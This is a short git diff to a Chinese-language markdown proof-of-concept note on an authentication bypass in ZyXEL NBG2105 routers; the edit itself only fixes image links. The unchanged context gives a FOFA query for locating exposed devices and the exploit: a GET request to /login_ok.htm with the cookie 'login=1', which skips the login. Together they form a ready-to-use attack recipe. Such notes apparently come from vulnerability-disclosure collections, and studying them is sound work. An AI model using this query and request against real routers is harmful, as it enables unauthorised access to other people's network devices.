@@ -2,7 +2,8 @@
 
 ## 资产搜索：
 
-fofa app="ZyXEL-NBG2105"
+fofa app="ZyXEL-NBG2105"  
+![](img/login.png)
 
 ## POC：
 访问`url/login_ok.htm` cookie设置为`login=1`
@@ -10,4 +11,4 @@ fofa app="ZyXEL-NBG2105"
 GET /login_ok.htm HTTP/1.1
 cookie:login=1
 ```
-!()[img/passlogin.jpg]
+![](img/passlogin.jpg)
